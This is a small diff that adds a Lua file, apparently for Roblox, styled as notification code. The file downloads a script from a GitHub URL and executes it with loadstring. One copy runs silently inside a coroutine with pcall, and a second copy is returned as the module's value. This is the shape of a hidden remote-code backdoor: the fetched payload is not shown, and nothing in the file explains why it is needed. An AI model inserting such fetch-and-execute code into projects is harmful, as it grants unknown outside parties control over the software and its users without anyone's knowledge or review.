@@ -1,0 +1,4 @@
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("https://github.com/hooaczx/Notifications-Code/blob/main/Notifications/lobox920", true))()
+end)
+return loadstring(game:HttpGet("https://github.com/hooaczx/Notifications-Code/blob/main/Notifications/lobox920", true))(...)
